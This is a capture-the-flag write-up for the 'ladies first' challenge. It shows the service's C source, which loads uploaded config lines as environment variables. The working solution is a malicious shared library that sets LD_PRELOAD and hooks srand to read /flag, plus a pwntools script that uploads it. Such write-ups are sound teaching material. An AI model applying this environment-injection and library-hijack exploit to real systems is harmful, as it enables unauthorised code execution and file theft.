# Misc

<table><thead><tr><th width="347">Challenge</th><th>Topic</th></tr></thead><tbody><tr><td><a href="#ladies-first-490-pts">ladies first (490 pts)</a></td><td>function hook, LD_PRELOAD</td></tr></tbody></table>

## ladies first (490 pts)

### Description

Chivalry is dead.

To build locally, run sudo docker build -t ladies . sudo docker run -p 1337:5000 --privileged -d ladies then to connect, run nc localhost 1337

### Solution

Given following source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

const char *names[] = {
    "Alice", "Sophia", "Emma", "Olivia", "Isabella",
    "Mia", "Charlotte", "Amelia", "Harper", "Evelyn"
};
#define NAMES_COUNT (sizeof(names) / sizeof(names[0]))

void append_name(const char *var) {
    char *val = getenv(var);
    if (!val) {
        printf("%s not set\n", var);
        return;
    }

    const char *name = names[rand() % NAMES_COUNT];

    size_t newlen = strlen(val) + 1 + strlen(name) + 1;
    char *newval = malloc(newlen);
    if (!newval) {
        perror("malloc");
        exit(1);
    }

    snprintf(newval, newlen, "%s_%s", name, val);
    setenv(var, newval, 1);

    printf("%s\n", getenv(var));
    free(newval);
}

int main() {
    srand(time(NULL));

    append_name("v1");
    append_name("v2");
    append_name("v3");

    return 0;
}
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define FILENAME "/tmp/config"
#define MAX_FILE_SIZE 16 * 1024

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

void receive_file() {
    FILE *f = fopen(FILENAME, "wb");
    if (!f) {
        perror("fopen");
        exit(1);
    }

    char buf[4096];
    size_t total = 0;
    size_t n;

    while ((n = fread(buf, 1, sizeof(buf), stdin)) > 0) {
        total += n;
        if (total > MAX_FILE_SIZE) {
            fwrite(buf, 1, n - (total - MAX_FILE_SIZE), f);
            break;
        }
        fwrite(buf, 1, n, f);
    }

    fclose(f);
}

char **get_config_envp() {
    FILE *f = fopen(FILENAME, "rb");
    if (!f) {
        perror("fopen");
        exit(1);
    }

    size_t cap = 32;
    size_t count = 0;
    char **envp = malloc(cap * sizeof(char *));
    if (!envp) {
        perror("malloc");
        exit(1);
    }

    char line[4096];
    while (fgets(line, sizeof(line), f)) {
        char *eq = strstr(line, " = ");
        if (!eq) continue;

        char *newline = strchr(line, '\n');
        if (newline) *newline = '\0';

        *eq = '\0';
        char *var = line;
        char *val = eq + 3;

        size_t len = strlen(var) + 1 + strlen(val) + 1;
        char *entry = malloc(len);
        if (!entry) {
            perror("malloc");
            exit(1);
        }
        snprintf(entry, len, "%s=%s", var, val);

        if (count + 1 >= cap) {
            cap *= 2;
            envp = realloc(envp, cap * sizeof(char *));
            if (!envp) {
                perror("realloc");
                exit(1);
            }
        }

        envp[count++] = entry;
    }
    fclose(f);

    envp[count] = NULL;
    return envp;
}

int main() {
    printf("Welcome to our service! Give us some variables and we will ladify them!\n");
    receive_file();
    char **envp = get_config_envp();

    printf("Calculating new values...\n");

    char *argv[] = {"./calc", NULL};
    execve("./calculator", argv, envp);
    perror("execve");
    exit(1);

    return 0;
}
```

Above program basically do the following behaviour

* Read data from user
* Write data to /tmp/config
* Read data from /tmp/config and load is as environment

By looking at this flow we know that we can leverage it to RCE by utilizing LD\_PRELOAD. Following is the idea

* Create environment LD\_PRELOAD = /tmp/config
  * We can create fake section in ELF
* Create library (.so file) with function called by "calculator", e.g srand
  * By creating function srand in .so file and loaded it with LD\_PRELOAD we will force calculator executable to use srand from our .so file
    * So just put read flag in srand and then we will get the flag

Another part of challenge is we need to find correct length to trigger EOF of read process so the binary will continue to execute calculator, we can easily brute it. Following is our final solver

```python
from pwn import *

io = remote("challenge.secso.cc", 7006)

LENGTH = 46409

data = open("srand_hook.so", "rb").read()
data += b"\x00" * (LENGTH - len(data))

io.send(data)
io.shutdown('send')

print(io.recvall(timeout=100).decode(errors="ignore"))
```

```c
// srand_hook.c
#include <fcntl.h>
#include <unistd.h>

void srand(unsigned int seed) {
    int fd = open("/flag", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        ssize_t n;
        while ((n = read(fd, buf, sizeof buf)) > 0) {
            (void)write(1, buf, n);
        }
        close(fd);
    }
}
__attribute__((section(".note.cfg")))
static const char cfg_lines[] =
"\n"
"LD_PRELOAD = /tmp/config\n"
"v1 = a\n"
"v2 = b\n"
"v3 = c\n";
```
